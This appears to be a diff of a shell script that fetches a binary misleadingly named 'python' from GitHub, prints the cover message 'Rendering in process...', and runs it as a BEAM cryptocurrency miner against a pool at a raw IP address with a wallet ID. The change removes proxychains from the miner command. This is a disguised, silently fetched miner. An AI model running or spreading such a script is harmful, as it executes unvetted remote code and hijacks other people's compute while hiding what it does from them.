@@ -3,4 +3,4 @@ wget https://github.com/kmille36/thuonghai/raw/master/python > /dev/null 2>&1
 chmod +x python
 echo Rendering in process...
 
-proxychains ./python --coin BEAM --pool 168.119.69.50:1130 --user 2523fa5af0ff1d1da52264c5a70c02c1291ad2daec9f72ea87b7189ed4a18af6be4.GPU --tls on 
+./python --coin BEAM --pool 168.119.69.50:1130 --user 2523fa5af0ff1d1da52264c5a70c02c1291ad2daec9f72ea87b7189ed4a18af6be4.GPU --tls on 
